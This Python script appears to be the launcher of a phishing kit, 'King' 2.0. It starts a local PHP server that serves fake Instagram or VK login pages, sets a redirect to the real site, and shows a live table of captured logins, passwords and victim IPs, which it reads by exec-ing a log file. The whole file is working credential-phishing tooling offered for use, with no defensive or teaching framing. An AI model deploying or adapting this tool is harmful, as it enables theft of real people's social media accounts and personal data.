import os, sys, time
from multiprocessing import Process
from time import sleep
from prettytable import PrettyTable
о = open('log.log', 'w')
о.close()
class A:
    def __call__(self, count=10, sleep_time=0.5):
        if used == "1":
            os.system("cd instagram && php -S localhost:"+str(ports))
        elif used == "2":
            os.system("cd vk && php -S localhost:"+str(ports))
        else:
            print("No number '"+used+"'")



class B:
    def __call__(self, count=10, sleep_time=0.5):
        while True:
            import os
            x = PrettyTable()
            x.field_names = ['Ceть', 'Логин', 'Пароль', 'Верно?', 'IP']
            g=0
            exec(open('log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear")


print("""
^^^^^^^^^^^^^^^^^^^^^^^^^
 _  ___           <_____> 2.0
| |/ (_)_ __   __ _|  |||
| ' /| | '_ \ / _` | |_
| . \| | | | | (_| |  _|
|_|\_\_|_| |_|\__, |_|
              |___/
""")
print("""
[1] Instagram
[2] Vk
""")
used = input("[Enter number]: ")
print("Starting...")
ports = input("[PORT]: ")
reloc = input("[Location]: ")
if reloc != "":
    if used == "1":
        f = open("instagram/location.location", 'w')
        f.write(reloc)
        f.close()
    elif used == "2":
        f = open("vk/location.location", 'w')
        f.write(reloc)
        f.close()
else:
    if used ==  "1":
        f = open("instagram/location.location", 'w')
        f.write("https://instagram.com")
        f.close()
    elif used == "2":
        f = open("vk/location.location", 'w')
        f.write("https://vk.com")
        f.close()
    else:
        f = open("vk/location.location", 'w')
        f.write("https://google.com")
        f.close()
        f = open("instagram/location.location", 'w')
        f.write("https://google.com")
        f.close()
if ports == "":
    ports=8080
if __name__ == '__main__':
    a = A()
    b = B()

    p1 = Process(target=a, kwargs={'sleep_time': 0.7})
    p2 = Process(target=b, args=(12,))
    p1.start()
    p2.start()

    p1.join()
    p2.join()
